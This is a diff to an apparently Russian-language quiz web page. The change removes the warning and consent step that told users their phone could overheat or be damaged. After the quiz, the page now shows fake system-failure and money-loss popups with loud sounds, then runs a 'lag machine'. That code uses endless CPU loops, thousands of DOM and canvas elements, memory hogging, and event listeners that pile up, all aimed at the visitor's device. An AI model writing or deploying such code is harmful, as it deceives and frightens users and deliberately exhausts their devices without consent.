@@ -126,25 +126,6 @@
             animation: shimmer 1.5s linear infinite;
         }
 
-        .warning-message {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 18px;
-            color: #ff0000;
-            text-shadow: 0 0 10px #ff0000;
-            text-align: center;
-            background: rgba(0, 0, 0, 0.8);
-            padding: 20px;
-            border-radius: 10px;
-            border: 2px solid #ff0000;
-            max-width: 80%;
-            z-index: 1000;
-            animation: warningPulse 2s infinite;
-            display: none;
-        }
-
         .question-container {
             width: 90%;
             max-width: 700px;
@@ -248,11 +229,6 @@
         @keyframes textGlow {
             0% { text-shadow: 0 0 10px #00ffff; }
             100% { text-shadow: 0 0 25px #00ffff; }
-        }
-
-        @keyframes warningPulse {
-            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-            50% { transform: translate(-50%, -50%) scale(1.05); opacity: 0.8; }
         }
 
         /* Анимации хаоса */
@@ -498,14 +474,6 @@
             z-index: 5;
             opacity: 0.8;
         }
-
-        .heavy-element {
-            position: absolute;
-            background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff);
-            border-radius: 50%;
-            filter: blur(5px);
-            mix-blend-mode: difference;
-        }
     </style>
 </head>
 <body>
@@ -527,14 +495,6 @@
             <div class="progress-bar">
                 <div class="progress-fill" id="progressFill"></div>
             </div>
-        </div>
-
-        <div class="warning-message" id="warningMessage">
-            ⚠️ ВНИМАНИЕ! ⚠️<br><br>
-            После завершения теста ваш телефон будет экстремально нагружен!<br>
-            Устройство может сильно лагать, перегреваться или даже выключиться!<br>
-            Возможно повреждение устройства!<br><br>
-            ПРОДОЛЖАЯ, ВЫ СОГЛАШАЕТЕСЬ С РИСКОМ!
         </div>
     </div>
     
@@ -578,7 +538,7 @@
         let audioContext;
         let bombSoundInterval;
         let chaosIntervals = [];
-        let lagMachineStarted = false;
+        let phase35Started = false;
 
         const normalPhase = document.getElementById('normalPhase');
         const chaosPhase = document.getElementById('chaosPhase');
@@ -589,7 +549,6 @@
         const progressFill = document.getElementById('progressFill');
         const bombTimer = document.getElementById('bombTimer');
         const whiteFlash = document.getElementById('whiteFlash');
-        const warningMessage = document.getElementById('warningMessage');
 
         function init() {
             const savedAnswers = localStorage.getItem('digameAnswers');
@@ -602,8 +561,7 @@
 
         function showQuestion() {
             if (currentQuestion >= questions.length) {
-                // Показываем предупреждение перед запуском хаоса
-                showFinalWarning();
+                startChaosPhase();
                 return;
             }
 
@@ -622,22 +580,6 @@
             const progress = (currentQuestion / questions.length) * 100;
             progressText.textContent = `Анализ: ${Math.round(progress)}%`;
             progressFill.style.width = `${progress}%`;
-        }
-
-        function showFinalWarning() {
-            warningMessage.style.display = 'block';
-            
-            // Добавляем кнопку подтверждения
-            const confirmButton = document.createElement('button');
-            confirmButton.className = 'answer-btn';
-            confirmButton.textContent = 'Я ПОНИМАЮ РИСКИ. ПРОДОЛЖИТЬ';
-            confirmButton.style.marginTop = '20px';
-            confirmButton.style.background = 'rgba(255, 0, 0, 0.3)';
-            confirmButton.style.borderColor = '#ff0000';
-            confirmButton.style.color = '#ff0000';
-            confirmButton.addEventListener('click', startChaosPhase);
-            
-            warningMessage.appendChild(confirmButton);
         }
 
         function selectAnswer(answer) {
@@ -747,13 +689,9 @@
             bombTimer.style.display = 'none';
             chaosStarted = true;
             
-            // Сразу запускаем экстремальную лаг-машину на 15 секунд
-            startExtremeLagMachine();
-            
+            // Начинаем с анимаций и эффектов
             applyChaosEffects();
             createErrorPopups();
-            createMoneyPopups();
-            createDangerPopups();
             createCrackEffect();
             createParticles();
             
@@ -764,160 +702,274 @@
             
             playChaosSounds();
             
-            // Всего хаос длится 15 секунд
-            setTimeout(endChaos, 15000);
+            // Через 35 секунд запускаем лаг-машину и денежные потери
+            setTimeout(startLagMachinePhase, 35000);
+            
+            // Всего хаос длится 45 секунд
+            setTimeout(endChaos, 45000);
         }
 
-        function startExtremeLagMachine() {
-            if (lagMachineStarted) return;
-            lagMachineStarted = true;
+        function startLagMachinePhase() {
+            phase35Started = true;
+            
+            // Запускаем интенсивную лаг-машину
+            startHeavyLagMachine();
+            
+            // Добавляем денежные потери и предупреждения
+            createMoneyPopups();
+            createDangerPopups();
+            
+            // Усиливаем эффекты
+            chaosPhase.style.animation = 'shake-hard 0.01s infinite, glitch 0.05s infinite';
+        }
 
-            console.log("🔥 ЗАПУСК ЭКСТРЕМАЛЬНОЙ ЛАГ-МАШИНЫ 🔥");
+        function startHeavyLagMachine() {
+    console.log("💀 ЗАПУСК УЛЬТРА-ЛАГ МАШИНЫ 💀");
+    
+    // 1. МАССИВНЫЕ DOM-ЭЛЕМЕНТЫ (x100)
+    for (let i = 0; i < 5000; i++) { // было 800
+        const shape = document.createElement('div');
+        shape.className = 'hidden-load complex-shape';
+        shape.style.cssText = `
+            width: ${Math.random() * 800 + 200}px;
+            height: ${Math.random() * 800 + 200}px;
+            left: ${Math.random() * 200 - 50}vw;
+            top: ${Math.random() * 200 - 50}vh;
+            animation: glitch ${Math.random() * 1 + 0.1}s infinite;
+            filter: hue-rotate(${Math.random() * 360}deg) 
+                    blur(${Math.random() * 50}px) 
+                    contrast(${Math.random() * 200}%);
+            background: conic-gradient(
+                from ${Math.random() * 360}deg,
+                red, orange, yellow, green, blue, purple, red
+            );
+            transform: scale(${Math.random() * 3}) 
+                       rotate(${Math.random() * 360}deg)
+                       skew(${Math.random() * 45}deg);
+        `;
+        document.body.appendChild(shape);
+    }
 
-            // Фаза 1: Создание тысяч сложных элементов
-            for (let i = 0; i < 5000; i++) {
-                setTimeout(() => {
-                    const shape = document.createElement('div');
-                    shape.className = 'hidden-load complex-shape';
-                    shape.style.width = Math.random() * 500 + 50 + 'px';
-                    shape.style.height = Math.random() * 500 + 50 + 'px';
-                    shape.style.left = Math.random() * 100 + 'vw';
-                    shape.style.top = Math.random() * 100 + 'vh';
-                    shape.style.animation = `glitch ${Math.random() * 2 + 0.5}s infinite`;
-                    shape.style.filter = `hue-rotate(${Math.random() * 360}deg) blur(${Math.random() * 25}px) brightness(${Math.random() * 2})`;
-                    shape.style.mixBlendMode = ['screen', 'difference', 'overlay', 'hard-light'][Math.floor(Math.random() * 4)];
-                    document.body.appendChild(shape);
-                }, Math.random() * 5000);
+    // 2. СУПЕР-ИНТЕНСИВНЫЕ ВЫЧИСЛЕНИЯ
+    const ultraHeavyCalculation = setInterval(() => {
+        if (!chaosStarted) {
+            clearInterval(ultraHeavyCalculation);
+            return;
+        }
+        
+        // МАКСИМАЛЬНАЯ НАГРУЗКА НА CPU
+        let megaResult = 0;
+        for (let i = 0; i < 10000000; i++) { // было 5,000,000
+            megaResult += Math.sin(i) * Math.cos(i) * Math.tan(i) * 
+                         Math.log(i + 1) * Math.sqrt(i + 1);
+        }
+        
+        // ДОПОЛНИТЕЛЬНЫЕ ТЯЖЕЛЫЕ ОПЕРАЦИИ
+        const hugeArray = new Float64Array(50000);
+        for (let i = 0; i < hugeArray.length; i++) {
+            hugeArray[i] = Math.pow(i, 3) * Math.exp(i * 0.001);
+        }
+        
+        // РЕКУРСИВНЫЕ ВЫЧИСЛЕНИЯ
+        function recursiveStress(depth) {
+            if (depth <= 0) return 1;
+            return recursiveStress(depth - 1) + recursiveStress(depth - 2);
+        }
+        recursiveStress(25);
+        
+    }, 10); // было 50ms - теперь каждые 10ms!
+
+    chaosIntervals.push(ultraHeavyCalculation);
+
+    // 3. МАССОВОЕ СОЗДАНИЕ/УДАЛЕНИЕ DOM ЭЛЕМЕНТОВ
+    const domStorm = setInterval(() => {
+        if (!chaosStarted) {
+            clearInterval(domStorm);
+            return;
+        }
+        
+        // СОЗДАЕМ 200 ЭЛЕМЕНТОВ КАЖДЫЕ 50ms
+        for (let i = 0; i < 200; i++) {
+            const stormElement = document.createElement('div');
+            stormElement.innerHTML = `
+                <div style="
+                    position: absolute;
+                    width: ${Math.random() * 300}px;
+                    height: ${Math.random() * 300}px;
+                    background: radial-gradient(
+                        circle at ${Math.random() * 100}% ${Math.random() * 100}%,
+                        rgba(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255},0.8),
+                        transparent
+                    );
+                    transform: matrix3d(
+                        ${Math.random()}, ${Math.random()}, ${Math.random()}, ${Math.random()},
+                        ${Math.random()}, ${Math.random()}, ${Math.random()}, ${Math.random()},
+                        ${Math.random()}, ${Math.random()}, ${Math.random()}, ${Math.random()},
+                        ${Math.random() * 100}, ${Math.random() * 100}, ${Math.random() * 100}, 1
+                    );
+                    filter: blur(${Math.random() * 20}px) 
+                            hue-rotate(${Math.random() * 360}deg)
+                            contrast(${Math.random() * 300}%);
+                "></div>
+            `;
+            document.body.appendChild(stormElement);
+            
+            // УДАЛЯЕМ ЧЕРЕЗ СЛУЧАЙНОЕ ВРЕМЯ
+            setTimeout(() => {
+                if (document.body.contains(stormElement)) {
+                    document.body.removeChild(stormElement);
+                }
+            }, Math.random() * 1000);
+        }
+    }, 50);
+
+    chaosIntervals.push(domStorm);
+
+    // 4. WebGL/Canvas АТАКА
+    const canvasAttack = setInterval(() => {
+        if (!chaosStarted) {
+            clearInterval(canvasAttack);
+            return;
+        }
+        
+        // СОЗДАЕМ МНОЖЕСТВО CANVAS ЭЛЕМЕНТОВ
+        for (let i = 0; i < 20; i++) {
+            const canvas = document.createElement('canvas');
+            canvas.width = 800;
+            canvas.height = 600;
+            canvas.style.cssText = `
+                position: absolute;
+                left: ${Math.random() * 100}vw;
+                top: ${Math.random() * 100}vh;
+                opacity: 0.01;
+                pointer-events: none;
+            `;
+            document.body.appendChild(canvas);
+            
+            const ctx = canvas.getContext('2d');
+            
+            // ИНТЕНСИВНАЯ ОТРИСОВКА
+            for (let j = 0; j < 1000; j++) {
+                ctx.fillStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.1)`;
+                ctx.beginPath();
+                ctx.arc(
+                    Math.random() * 800,
+                    Math.random() * 600,
+                    Math.random() * 100,
+                    0,
+                    Math.PI * 2
+                );
+                ctx.fill();
+                
+                // СЛОЖНЫЕ ПУТИ
+                ctx.strokeStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                ctx.lineWidth = Math.random() * 10;
+                ctx.beginPath();
+                for (let k = 0; k < 50; k++) {
+                    ctx.lineTo(
+                        Math.random() * 800,
+                        Math.random() * 600
+                    );
+                }
+                ctx.stroke();
             }
+            
+            setTimeout(() => {
+                if (document.body.contains(canvas)) {
+                    document.body.removeChild(canvas);
+                }
+            }, 500);
+        }
+    }, 100);
 
-            // Фаза 2: Тяжелые градиентные сетки
-            for (let i = 0; i < 1000; i++) {
-                setTimeout(() => {
-                    const mesh = document.createElement('div');
-                    mesh.className = 'hidden-load gradient-mesh';
-                    mesh.style.width = Math.random() * 800 + 200 + 'px';
-                    mesh.style.height = Math.random() * 800 + 200 + 'px';
-                    mesh.style.left = Math.random() * 100 + 'vw';
-                    mesh.style.top = Math.random() * 100 + 'vh';
-                    mesh.style.filter = `blur(${Math.random() * 30}px) contrast(${Math.random() * 3})`;
-                    chaosPhase.appendChild(mesh);
-                }, Math.random() * 3000);
-            }
+    chaosIntervals.push(canvasAttack);
 
-            // Фаза 3: Матричные элементы
-            for (let i = 0; i < 2000; i++) {
-                setTimeout(() => {
-                    const matrix = document.createElement('div');
-                    matrix.className = 'matrix-element';
-                    matrix.textContent = String.fromCharCode(33 + Math.floor(Math.random() * 90));
-                    matrix.style.left = Math.random() * 100 + 'vw';
-                    matrix.style.top = Math.random() * 100 + 'vh';
-                    matrix.style.fontSize = (Math.random() * 40 + 8) + 'px';
-                    matrix.style.transform = `rotate(${Math.random() * 360}deg) scale(${Math.random() * 2})`;
-                    chaosPhase.appendChild(matrix);
-                }, Math.random() * 4000);
-            }
+    // 5. ПАМЯТЬ АТАКА
+    const memoryAttack = setInterval(() => {
+        if (!chaosStarted) {
+            clearInterval(memoryAttack);
+            return;
+        }
+        
+        // СОЗДАЕМ ОГРОМНЫЕ МАССИВЫ В ПАМЯТИ
+        const memoryHog = [];
+        for (let i = 0; i < 100; i++) {
+            memoryHog.push(new Array(100000).fill({
+                data: new Array(1000).fill(Math.random()),
+                timestamp: Date.now(),
+                nested: {
+                    level1: new Array(100).fill({
+                        level2: new Array(50).fill({
+                            level3: Math.random()
+                        })
+                    })
+                }
+            }));
+        }
+        
+        // НЕ ОЧИЩАЕМ СРАЗУ - ДАЕМ НАКОПИТЬСЯ
+        setTimeout(() => {
+            memoryHog.length = 0;
+        }, 5000);
+        
+    }, 2000);
 
-            // Фаза 4: Супер-тяжелые элементы
-            for (let i = 0; i < 800; i++) {
-                setTimeout(() => {
-                    const heavy = document.createElement('div');
-                    heavy.className = 'heavy-element';
-                    heavy.style.width = Math.random() * 400 + 100 + 'px';
-                    heavy.style.height = Math.random() * 400 + 100 + 'px';
-                    heavy.style.left = Math.random() * 100 + 'vw';
-                    heavy.style.top = Math.random() * 100 + 'vh';
-                    heavy.style.background = `conic-gradient(
+    chaosIntervals.push(memoryAttack);
+
+    // 6. CSS АНИМАЦИОННАЯ АТАКА
+    const cssAttack = setInterval(() => {
+        if (!chaosStarted) {
+            clearInterval(cssAttack);
+            return;
+        }
+        
+        // ДИНАМИЧЕСКИ МЕНЯЕМ СТИЛИ ВСЕХ ЭЛЕМЕНТОВ
+        const allElements = document.querySelectorAll('*');
+        allElements.forEach(el => {
+            if (Math.random() > 0.7) {
+                el.style.cssText += `
+                    transform: translate(${Math.random() * 100 - 50}px, ${Math.random() * 100 - 50}px) 
+                               rotate(${Math.random() * 360}deg) 
+                               scale(${Math.random() * 2});
+                    filter: hue-rotate(${Math.random() * 360}deg) 
+                            blur(${Math.random() * 5}px)
+                            contrast(${Math.random() * 200}%);
+                    background: conic-gradient(
                         from ${Math.random() * 360}deg,
-                        #ff0000, #00ff00, #0000ff, #ffff00, #ff00ff, #00ffff, #ff0000
-                    )`;
-                    heavy.style.filter = `blur(${Math.random() * 15}px) hue-rotate(${Math.random() * 360}deg)`;
-                    heavy.style.mixBlendMode = ['multiply', 'screen', 'overlay', 'difference'][Math.floor(Math.random() * 4)];
-                    document.body.appendChild(heavy);
-                }, Math.random() * 2000);
+                        #ff0000, #00ff00, #0000ff, #ff0000
+                    );
+                `;
             }
+        });
+    }, 100);
 
-            // ЭКСТРЕМАЛЬНЫЕ ВЫЧИСЛЕНИЯ
-            const extremeCalculation1 = setInterval(() => {
-                if (!chaosStarted) {
-                    clearInterval(extremeCalculation1);
-                    return;
-                }
-                // 50 миллионов операций
-                let result = 0;
-                for (let i = 0; i < 50000000; i++) {
-                    result += Math.sin(i) * Math.cos(i) * Math.tan(i) * Math.atan(i);
-                }
-            }, 100);
+    chaosIntervals.push(cssAttack);
 
-            const extremeCalculation2 = setInterval(() => {
-                if (!chaosStarted) {
-                    clearInterval(extremeCalculation2);
-                    return;
-                }
-                // Создание и обработка огромных массивов
-                const hugeArray = new Float64Array(1000000);
-                for (let i = 0; i < hugeArray.length; i++) {
-                    hugeArray[i] = Math.sqrt(i) * Math.pow(i, 1.5) * Math.log(i + 1);
-                }
-                // Сортировка и преобразования
-                const sorted = Array.from(hugeArray).sort((a, b) => a - b);
-                const mapped = sorted.map(x => Math.sin(x) * Math.cos(x));
-            }, 150);
-
-            const extremeCalculation3 = setInterval(() => {
-                if (!chaosStarted) {
-                    clearInterval(extremeCalculation3);
-                    return;
-                }
-                // Рекурсивные вычисления
-                function heavyRecursion(depth, maxDepth) {
-                    if (depth >= maxDepth) return depth;
-                    let sum = 0;
-                    for (let i = 0; i < 100; i++) {
-                        sum += heavyRecursion(depth + 1, maxDepth);
-                    }
-                    return sum;
-                }
-                heavyRecursion(0, 6);
-            }, 200);
-
-            // ДОПОЛНИТЕЛЬНАЯ НАГРУЗКА НА DOM
-            const domLoadInterval = setInterval(() => {
-                if (!chaosStarted) {
-                    clearInterval(domLoadInterval);
-                    return;
-                }
-                // Создание 100 временных элементов каждые 50мс
-                for (let i = 0; i < 100; i++) {
-                    const temp = document.createElement('div');
-                    temp.style.cssText = `
-                        position: absolute;
-                        opacity: 0.001;
-                        width: ${Math.random() * 300}px;
-                        height: ${Math.random() * 300}px;
-                        left: ${Math.random() * 100}vw;
-                        top: ${Math.random() * 100}vh;
-                        background: conic-gradient(
-                            from ${Math.random() * 360}deg,
-                            hsl(${Math.random() * 360}, 100%, 50%),
-                            hsl(${Math.random() * 360}, 100%, 50%),
-                            hsl(${Math.random() * 360}, 100%, 50%)
-                        );
-                        transform: rotate(${Math.random() * 360}deg) scale(${Math.random() * 2});
-                        filter: blur(${Math.random() * 10}px);
-                    `;
-                    document.body.appendChild(temp);
-                    setTimeout(() => {
-                        if (document.body.contains(temp)) {
-                            document.body.removeChild(temp);
-                        }
-                    }, 50);
-                }
-            }, 50);
-
-            chaosIntervals.push(extremeCalculation1, extremeCalculation2, extremeCalculation3, domLoadInterval);
+    // 7. EVENT LISTENER АТАКА
+    const eventAttack = setInterval(() => {
+        if (!chaosStarted) {
+            clearInterval(eventAttack);
+            return;
         }
+        
+        // ДОБАВЛЯЕМ ТЫСЯЧИ EVENT LISTENERS
+        for (let i = 0; i < 100; i++) {
+            const handler = () => {
+                // ПУСТАЯ ФУНКЦИЯ ДЛЯ НАГРУЗКИ
+                const temp = Math.random() * 1000000;
+            };
+            
+            document.addEventListener('mousemove', handler);
+            document.addEventListener('click', handler);
+            document.addEventListener('scroll', handler);
+            document.addEventListener('keydown', handler);
+            
+            // НЕ УДАЛЯЕМ - ДАЕМ НАКОПИТЬСЯ
+        }
+    }, 500);
+
+    chaosIntervals.push(eventAttack);
+}
 
         function applyChaosEffects() {
             let colorIndex = 0;
@@ -926,9 +978,9 @@
             const colorInterval = setInterval(() => {
                 chaosPhase.style.backgroundColor = colors[colorIndex];
                 colorIndex = (colorIndex + 1) % colors.length;
-            }, 50);
+            }, 100);
             
-            chaosPhase.style.animation = 'shake-hard 0.01s infinite, glitch 0.05s infinite';
+            chaosPhase.style.animation = 'shake-hard 0.03s infinite, glitch 0.15s infinite';
             chaosIntervals.push(colorInterval);
         }
 
@@ -936,11 +988,10 @@
             const errors = [
                 "SYSTEM FAILURE", "CRITICAL ERROR", "MEMORY CORRUPTION", "KERNEL PANIC",
                 "DATA BREACH DETECTED", "UNAUTHORIZED ACCESS", "SECURITY BREACH", "NETWORK FAILURE",
-                "HARDWARE MALFUNCTION", "SOFTWARE CORRUPTION", "ACCESS DENIED", "FILE SYSTEM CORRUPTED",
-                "CPU OVERLOAD", "GPU FAILURE", "THERMAL THROTTLING", "MEMORY LEAK", "STACK OVERFLOW"
+                "HARDWARE MALFUNCTION", "SOFTWARE CORRUPTION", "ACCESS DENIED", "FILE SYSTEM CORRUPTED"
             ];
             
-            for (let i = 0; i < 200; i++) {
+            for (let i = 0; i < 60; i++) {
                 setTimeout(() => {
                     const errorPopup = document.createElement('div');
                     errorPopup.className = 'error-popup';
@@ -949,9 +1000,8 @@
                     errorPopup.style.top = `${Math.random() * 85}%`;
                     errorPopup.style.left = `${Math.random() * 85}%`;
                     
-                    const size = 300 + Math.random() * 500;
+                    const size = 200 + Math.random() * 400;
                     errorPopup.style.width = `${size}px`;
-                    errorPopup.style.fontSize = `${20 + Math.random() * 15}px`;
                     
                     chaosPhase.appendChild(errorPopup);
                     
@@ -959,58 +1009,51 @@
                         if (chaosPhase.contains(errorPopup)) {
                             chaosPhase.removeChild(errorPopup);
                         }
-                    }, 2000 + Math.random() * 1000);
-                }, Math.random() * 12000);
+                    }, 3000 + Math.random() * 2000);
+                }, Math.random() * 35000);
             }
         }
 
         function createMoneyPopups() {
-            const moneyValues = [
-                "-80₽", "-1000₽", "-180₽", "-250₽", "-500₽", "-1500₽", "-75₽", "-2000₽", 
-                "-800₽", "-1200₽", "-5000₽", "-10000₽", "-25000₽", "-50000₽", "-100000₽"
-            ];
+            const moneyValues = ["-80₽", "-1000₽", "-180₽", "-250₽", "-500₽", "-1500₽", "-75₽", "-2000₽", "-800₽", "-1200₽"];
             
-            for (let i = 0; i < 100; i++) {
+            for (let i = 0; i < 40; i++) {
                 setTimeout(() => {
                     const money = document.createElement('div');
                     money.className = 'money-popup';
                     money.textContent = moneyValues[Math.floor(Math.random() * moneyValues.length)];
-                    money.style.left = `${Math.random() * 95}%`;
-                    money.style.animationDuration = `${1 + Math.random() * 3}s`;
-                    money.style.fontSize = `${24 + Math.random() * 25}px`;
+                    money.style.left = `${Math.random() * 90}%`;
+                    money.style.animationDuration = `${2 + Math.random() * 4}s`;
+                    money.style.fontSize = `${28 + Math.random() * 20}px`;
                     chaosPhase.appendChild(money);
                     
                     setTimeout(() => {
                         if (chaosPhase.contains(money)) {
                             chaosPhase.removeChild(money);
                         }
-                    }, 5000);
-                }, Math.random() * 12000);
+                    }, 8000);
+                }, Math.random() * 10000);
             }
         }
 
         function createDangerPopups() {
-            const dangers = [
-                "ОПАСНОСТЬ!", "УГРОЗА!", "ВНИМАНИЕ!", "ПРЕДУПРЕЖДЕНИЕ!", 
-                "ALERT!", "DANGER!", "WARNING!", "CRITICAL!", "FATAL ERROR!"
-            ];
+            const dangers = ["ОПАСНОСТЬ!", "УГРОЗА!", "ВНИМАНИЕ!", "ПРЕДУПРЕЖДЕНИЕ!", "ALERT!", "DANGER!"];
             
-            for (let i = 0; i < 80; i++) {
+            for (let i = 0; i < 25; i++) {
                 setTimeout(() => {
                     const danger = document.createElement('div');
                     danger.className = 'danger-popup';
                     danger.textContent = dangers[Math.floor(Math.random() * dangers.length)];
                     danger.style.top = `${Math.random() * 80}%`;
                     danger.style.left = `${Math.random() * 80}%`;
-                    danger.style.fontSize = `${35 + Math.random() * 25}px`;
                     chaosPhase.appendChild(danger);
                     
                     setTimeout(() => {
                         if (chaosPhase.contains(danger)) {
                             chaosPhase.removeChild(danger);
                         }
-                    }, 1500);
-                }, Math.random() * 12000);
+                    }, 2000);
+                }, Math.random() * 10000);
             }
         }
 
@@ -1021,17 +1064,17 @@
         }
 
         function createParticles() {
-            for (let i = 0; i < 500; i++) {
+            for (let i = 0; i < 150; i++) {
                 setTimeout(() => {
                     const particle = document.createElement('div');
                     particle.className = 'particle';
                     particle.style.left = `${Math.random() * 100}%`;
                     particle.style.top = `${Math.random() * 100}%`;
-                    particle.style.setProperty('--tx', `${Math.random() * 400 - 200}px`);
-                    particle.style.setProperty('--ty', `${Math.random() * 400 - 200}px`);
+                    particle.style.setProperty('--tx', `${Math.random() * 200 - 100}px`);
+                    particle.style.setProperty('--ty', `${Math.random() * 200 - 100}px`);
                     particle.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
-                    particle.style.width = `${1 + Math.random() * 8}px`;
-                    particle.style.height = `${1 + Math.random() * 8}px`;
+                    particle.style.width = `${2 + Math.random() * 6}px`;
+                    particle.style.height = `${2 + Math.random() * 6}px`;
                     chaosPhase.appendChild(particle);
                     
                     setTimeout(() => {
@@ -1039,7 +1082,7 @@
                             chaosPhase.removeChild(particle);
                         }
                     }, 3000);
-                }, Math.random() * 12000);
+                }, Math.random() * 35000);
             }
         }
 
@@ -1048,7 +1091,7 @@
             
             // МОЩНЫЙ ВЗРЫВ
             setTimeout(() => {
-                for (let i = 0; i < 3; i++) {
+                for (let i = 0; i < 2; i++) {
                     const explosionOscillator = audioContext.createOscillator();
                     const explosionGain = audioContext.createGain();
                     const explosionFilter = audioContext.createBiquadFilter();
@@ -1058,34 +1101,36 @@
                     explosionGain.connect(audioContext.destination);
                     
                     explosionOscillator.type = 'sawtooth';
-                    explosionOscillator.frequency.setValueAtTime(15 + i * 10, audioContext.currentTime);
-                    explosionOscillator.frequency.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 4);
+                    explosionOscillator.frequency.setValueAtTime(20 + i * 15, audioContext.currentTime);
+                    explosionOscillator.frequency.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 3);
                     
                     explosionFilter.type = 'lowpass';
-                    explosionFilter.frequency.value = 80;
-                    explosionFilter.Q.value = 15;
+                    explosionFilter.frequency.value = 100;
+                    explosionFilter.Q.value = 12;
                     
-                    explosionGain.gain.setValueAtTime(0.8 - i * 0.2, audioContext.currentTime);
-                    explosionGain.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 4);
+                    explosionGain.gain.setValueAtTime(0.7 - i * 0.2, audioContext.currentTime);
+                    explosionGain.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 3);
                     
                     explosionOscillator.start(audioContext.currentTime + i * 0.2);
-                    explosionOscillator.stop(audioContext.currentTime + i * 0.2 + 4);
+                    explosionOscillator.stop(audioContext.currentTime + i * 0.2 + 3);
                 }
             }, 100);
 
-            // ЭКСТРЕМАЛЬНЫЕ ПИЩАЩИЕ ЗВУКИ
-            for (let i = 0; i < 50; i++) {
-                setTimeout(() => {
-                    playSound(
-                        3000 + Math.random() * 3000,
-                        0.5 + Math.random() * 0.4,
-                        0.02 + Math.random() * 0.08,
-                        'square'
-                    );
-                }, Math.random() * 12000);
-            }
+            // ПИЩАЩИЕ ЗВУКИ (только после 35 секунд)
+            setTimeout(() => {
+                for (let i = 0; i < 20; i++) {
+                    setTimeout(() => {
+                        playSound(
+                            2500 + Math.random() * 2000,
+                            0.4 + Math.random() * 0.3,
+                            0.05 + Math.random() * 0.1,
+                            'square'
+                        );
+                    }, Math.random() * 10000);
+                }
+            }, 35000);
 
-            // ИНТЕНСИВНЫЕ СТАТИЧЕСКИЕ ПОМЕХИ
+            // СТАТИЧЕСКИЕ ПОМЕХИ
             const staticInterval = setInterval(() => {
                 if (!chaosStarted) {
                     clearInterval(staticInterval);
@@ -1101,23 +1146,23 @@
                 staticGain.connect(audioContext.destination);
                 
                 staticOscillator.type = 'square';
-                staticOscillator.frequency.value = 20 + Math.random() * 3000;
+                staticOscillator.frequency.value = 50 + Math.random() * 2000;
                 
                 staticFilter.type = 'bandpass';
-                staticFilter.frequency.value = 100 + Math.random() * 2000;
-                staticFilter.Q.value = 0.1 + Math.random() * 30;
+                staticFilter.frequency.value = 200 + Math.random() * 1500;
+                staticFilter.Q.value = 0.5 + Math.random() * 20;
                 
-                staticGain.gain.value = 0.3 + Math.random() * 0.6;
+                staticGain.gain.value = 0.2 + Math.random() * 0.4;
                 
                 staticOscillator.start();
-                staticOscillator.stop(audioContext.currentTime + 0.02 + Math.random() * 0.08);
-            }, 30);
+                staticOscillator.stop(audioContext.currentTime + 0.03 + Math.random() * 0.1);
+            }, 100);
             
             chaosIntervals.push(staticInterval);
 
-            // ЗВУКИ РАЗРУШЕНИЯ
+            // ЗВУК РАЗБИВАЮЩЕГОСЯ СТЕКЛА
             setTimeout(() => {
-                for (let i = 0; i < 12; i++) {
+                for (let i = 0; i < 6; i++) {
                     const glassOscillator = audioContext.createOscillator();
                     const glassGain = audioContext.createGain();
                     const glassFilter = audioContext.createBiquadFilter();
@@ -1127,24 +1172,24 @@
                     glassGain.connect(audioContext.destination);
                     
                     glassOscillator.type = 'sine';
-                    glassOscillator.frequency.value = 2000 + Math.random() * 3000;
-                    glassOscillator.frequency.exponentialRampToValueAtTime(300 + Math.random() * 500, audioContext.currentTime + 0.3);
+                    glassOscillator.frequency.value = 1500 + Math.random() * 2500;
+                    glassOscillator.frequency.exponentialRampToValueAtTime(400 + Math.random() * 400, audioContext.currentTime + 0.4);
                     
                     glassFilter.type = 'highpass';
-                    glassFilter.frequency.value = 1500 + Math.random() * 2000;
+                    glassFilter.frequency.value = 1000 + Math.random() * 1500;
                     
-                    glassGain.gain.setValueAtTime(0.3 + Math.random() * 0.4, audioContext.currentTime);
-                    glassGain.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.3);
+                    glassGain.gain.setValueAtTime(0.25 + Math.random() * 0.25, audioContext.currentTime);
+                    glassGain.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.4);
                     
-                    glassOscillator.start(audioContext.currentTime + i * 0.05);
-                    glassOscillator.stop(audioContext.currentTime + i * 0.05 + 0.3);
+                    glassOscillator.start(audioContext.currentTime + i * 0.08);
+                    glassOscillator.stop(audioContext.currentTime + i * 0.08 + 0.4);
                 }
-            }, 800);
+            }, 1500);
         }
 
         function endChaos() {
             chaosStarted = false;
-            lagMachineStarted = false;
+            phase35Started = false;
             
             // Останавливаем все интервалы
             chaosIntervals.forEach(interval => clearInterval(interval));
